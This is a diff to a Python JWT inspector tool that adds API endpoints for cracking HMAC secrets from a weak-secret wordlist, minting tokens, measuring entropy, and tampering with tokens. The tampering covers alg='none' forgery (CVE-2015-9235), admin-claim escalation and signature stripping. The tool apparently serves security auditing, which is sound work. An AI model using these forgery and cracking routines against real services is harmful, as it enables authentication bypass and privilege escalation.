@@ -165,6 +165,97 @@ def _api_catalog(_body: Dict[str, Any]) -> Dict[str, Any]:
     }
 
 
+def _api_crack(body: Dict[str, Any]) -> Dict[str, Any]:
+    token_parser, crypto_engine, _, _, catalog_mod = _get_core()
+    token = str(body.get("token", "")).strip()
+    if not token:
+        return {"error": "token field is required"}
+    parsed = token_parser.parse_token(token)
+    if not parsed.is_valid_format:
+        return {"error": "Invalid token format"}
+    alg = parsed.algorithm or "HS256"
+    wordlist = body.get("wordlist")
+    if not wordlist:
+        from jwt_inspector_guard.security_linter import COMMON_WEAK_SECRETS
+        wordlist = list(COMMON_WEAK_SECRETS)
+    cracked = crypto_engine.crack_hmac_secret(
+        parsed.header_b64, parsed.payload_b64, parsed.signature_b64 or "", alg, wordlist
+    )
+    return {
+        "found": cracked is not None,
+        "secret": cracked,
+        "tested_count": len(wordlist),
+        "algorithm": alg,
+    }
+
+
+def _api_mint(body: Dict[str, Any]) -> Dict[str, Any]:
+    _, crypto_engine, _, _, _ = _get_core()
+    header = body.get("header", {"alg": "HS256", "typ": "JWT"})
+    payload = body.get("payload", {"sub": "user_123", "name": "Alice"})
+    secret = str(body.get("secret", "secret"))
+    alg = str(body.get("algorithm", header.get("alg", "HS256"))).upper()
+    token = crypto_engine.generate_hmac_jwt(header, payload, secret, alg)
+    from jwt_inspector_guard.token_parser import parse_token
+    parsed = parse_token(token)
+    return {
+        "token": token,
+        "header_b64": parsed.header_b64,
+        "payload_b64": parsed.payload_b64,
+        "signature_b64": parsed.signature_b64,
+        "algorithm": alg,
+    }
+
+
+def _api_entropy(body: Dict[str, Any]) -> Dict[str, Any]:
+    token_parser, crypto_engine, _, _, _ = _get_core()
+    token = str(body.get("token", "")).strip()
+    if not token:
+        return {"error": "token field is required"}
+    parsed = token_parser.parse_token(token)
+    total_entropy = crypto_engine.calculate_token_entropy(token)
+    payload_entropy = crypto_engine.calculate_token_entropy(parsed.payload_b64)
+    sig_entropy = crypto_engine.calculate_token_entropy(parsed.signature_b64 or "")
+    return {
+        "total_entropy": total_entropy,
+        "payload_entropy": payload_entropy,
+        "signature_entropy": sig_entropy,
+        "length": len(token),
+    }
+
+
+def _api_tamper(body: Dict[str, Any]) -> Dict[str, Any]:
+    token_parser, crypto_engine, _, _, _ = _get_core()
+    token = str(body.get("token", "")).strip()
+    attack_type = str(body.get("type", "none")).lower()
+    if not token:
+        return {"error": "token field is required"}
+    parsed = token_parser.parse_token(token)
+    if not parsed.is_valid_format:
+        return {"error": "Invalid token format"}
+    
+    header = dict(parsed.header)
+    payload = dict(parsed.payload)
+    
+    if attack_type in ("none", "cve-2015-9235"):
+        header["alg"] = "none"
+        from jwt_inspector_guard.base64_url import base64url_encode_json
+        h_b64 = base64url_encode_json(header)
+        p_b64 = base64url_encode_json(payload)
+        tampered = f"{h_b64}.{p_b64}."
+    elif attack_type == "admin_escalate":
+        payload["role"] = "admin"
+        payload["is_admin"] = True
+        payload["admin"] = True
+        tampered = crypto_engine.generate_hmac_jwt(header, payload, "secret", header.get("alg", "HS256"))
+    elif attack_type == "strip_signature":
+        tampered = f"{parsed.header_b64}.{parsed.payload_b64}."
+    else:
+        tampered = token
+
+    return {"tampered_token": tampered, "attack_type": attack_type}
+
+
 _API_ROUTES = {
     "/api/decode": _api_decode,
     "/api/verify": _api_verify,
@@ -172,6 +263,10 @@ _API_ROUTES = {
     "/api/audit": _api_audit,
     "/api/inspect": _api_inspect,
     "/api/catalog": _api_catalog,
+    "/api/crack": _api_crack,
+    "/api/mint": _api_mint,
+    "/api/entropy": _api_entropy,
+    "/api/tamper": _api_tamper,
 }
 
 
